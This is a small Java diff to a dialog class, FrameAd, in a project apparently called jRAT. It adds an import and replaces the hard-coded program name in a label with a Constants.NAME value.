@@ -25,6 +25,7 @@ import javax.swing.JScrollPane;
 import javax.swing.ListModel;
 import javax.swing.ScrollPaneConstants;
 
+import pro.jrat.Constants;
 import pro.jrat.Contributors;
 import pro.jrat.Contributors.Donator;
 import pro.jrat.Main;
@@ -59,7 +60,7 @@ public class FrameAd extends BaseDialog {
 		setLocationRelativeTo(null);
 		setModal(true);
 		
-		JLabel lblJrat = new JLabel("jRAT " + Version.getVersion());
+		JLabel lblJrat = new JLabel(Constants.NAME + " " + Version.getVersion());
 		lblJrat.setBounds(185, 11, 138, 31);
 		lblJrat.setFont(new Font("Tahoma", Font.BOLD, 25));
 		
